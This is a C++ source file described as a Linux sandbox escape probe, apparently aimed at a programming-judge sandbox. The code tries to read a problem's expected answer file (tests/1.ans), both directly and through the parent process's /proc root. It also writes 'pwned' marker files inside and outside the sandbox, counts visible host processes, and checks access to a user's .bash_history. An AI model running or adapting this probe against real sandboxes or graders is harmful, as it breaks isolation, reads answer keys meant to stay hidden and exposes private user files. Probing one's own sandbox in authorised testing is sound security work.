// Linux sandbox escape probe (self-contained). Prints one diagnostic line:
// A = answer read via absolute path of <problem>/tests/1.ans   (-1 = blocked)
// B = answer read via /proc/<ppid>/root/<abs path>             (-1 = blocked)
// C = wrote <problem>/PWNED_lx.txt                             (1 = success)
// D = wrote /tmp/uj_pwned_lx.txt                               (1 = success)
// E = wrote /home/lenovo/uj_pwned_lx.txt                       (1 = success)
// F = number of numeric entries visible in /proc (host processes visible if large)
// G = can read /etc/shadow-like sensitive user file /home/lenovo/.bash_history (1 = yes)
#include <cstdio>
#include <cstring>
#include <string>
#include <unistd.h>
#include <dirent.h>
#include <limits.h>
#include <ctype.h>

static std::string problem_dir() {
    char buf[PATH_MAX] = {0};
    ssize_t n = readlink("/proc/self/cwd", buf, sizeof buf - 1);
    if (n <= 0) return "";
    std::string p(buf, n);
    size_t k = p.find("/.uj/");
    return k == std::string::npos ? "" : p.substr(0, k);
}
static int read_int(const std::string& path) {
    FILE* f = fopen(path.c_str(), "r");
    if (!f) return -1;
    int x = -1; if (fscanf(f, "%d", &x) != 1) x = -2;
    fclose(f); return x;
}
static int try_write(const std::string& path) {
    FILE* f = fopen(path.c_str(), "w");
    if (!f) return 0;
    fputs("pwned\n", f); fclose(f); return 1;
}
int main() {
    std::string pd = problem_dir();
    int A = read_int(pd + "/tests/1.ans");
    char rootp[64]; snprintf(rootp, sizeof rootp, "/proc/%d/root", (int)getppid());
    int B = read_int(std::string(rootp) + pd + "/tests/1.ans");
    int C = try_write(pd + "/PWNED_lx.txt");
    int D = try_write("/tmp/uj_pwned_lx.txt");
    int E = try_write("/home/lenovo/uj_pwned_lx.txt");
    int F = 0;
    if (DIR* d = opendir("/proc")) { while (dirent* e = readdir(d)) if (isdigit((unsigned char)e->d_name[0])) F++; closedir(d); }
    int G = 0; if (FILE* f = fopen("/home/lenovo/.bash_history", "r")) { G = 1; fclose(f); }
    printf("A=%d,B=%d,C=%d,D=%d,E=%d,F=%d,G=%d,pid=%d,ppid=%d,pd=%s\n", A, B, C, D, E, F, G, (int)getpid(), (int)getppid(), pd.c_str());
    if (FILE* r = fopen("/tmp/uj_lx_report.txt", "w")) {
        fprintf(r, "A=%d B=%d C=%d D=%d E=%d F=%d G=%d pid=%d ppid=%d pd=%s\n", A, B, C, D, E, F, G, (int)getpid(), (int)getppid(), pd.c_str());
        fclose(r);
    }
    return 0;
}
